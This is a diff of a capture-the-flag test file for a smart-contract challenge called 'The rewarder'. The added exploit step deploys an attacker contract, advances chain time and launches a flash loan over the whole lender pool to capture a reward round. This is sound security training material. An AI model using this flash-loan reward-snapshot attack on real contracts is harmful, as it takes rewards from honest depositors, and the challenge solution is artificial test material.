@@ -66,6 +66,15 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const rewardAttackerFactory = await ethers.getContractFactory('RewardAttacker', attacker);
+        const rewardAttacker = await rewardAttackerFactory.deploy(
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address
+        );        
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await rewardAttacker.startFlashLoan(TOKENS_IN_LENDER_POOL);        
     });
 
     after(async function () {
@@ -78,12 +87,12 @@ describe('[Challenge] The rewarder', function () {
 
         // Users should get neglegible rewards this round
         for (let i = 0; i < users.length; i++) {
-            await this.rewarderPool.connect(users[i]).distributeRewards();
-            let rewards = await this.rewardToken.balanceOf(users[i].address);
+             await this.rewarderPool.connect(users[i]).distributeRewards();
+             let rewards = await this.rewardToken.balanceOf(users[i].address);
             
-            // The difference between current and previous rewards balance should be lower than 0.01 tokens
-            let delta = rewards.sub(ethers.utils.parseEther('25'));
-            expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
+             // The difference between current and previous rewards balance should be lower than 0.01 tokens
+             let delta = rewards.sub(ethers.utils.parseEther('25'));
+             expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
         }
         
         // Rewards must have been issued to the attacker account
